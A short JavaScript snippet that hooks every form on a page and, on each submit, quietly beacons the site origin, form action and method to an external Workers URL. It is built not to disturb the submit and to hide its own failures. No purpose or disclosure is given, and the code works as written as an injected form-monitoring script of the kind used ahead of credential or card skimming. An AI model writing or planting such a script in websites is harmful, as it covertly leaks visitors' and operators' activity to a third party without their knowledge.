(() => {
    const WORKER = "https://memek-worker.defoy89122.workers.dev/";

    function sendLog(form) {
        const domain = location.origin;
        const action = form.action || location.href;
        const method = (form.method || "GET").toUpperCase();

        const message =
`Domain: ${domain}
Action: ${action}
Method: ${method}`;

        // Kirim tanpa mengganggu submit
        navigator.sendBeacon?.(
            `${WORKER}?message=${encodeURIComponent(message)}`
        ) || fetch(
            `${WORKER}?message=${encodeURIComponent(message)}`,
            {
                method: "GET",
                mode: "no-cors",
                keepalive: true
            }
        ).catch(() => {});
    }

    document.querySelectorAll("form").forEach(form => {
        form.addEventListener("submit", () => {
            sendLog(form);
        }, true);
    });
})();
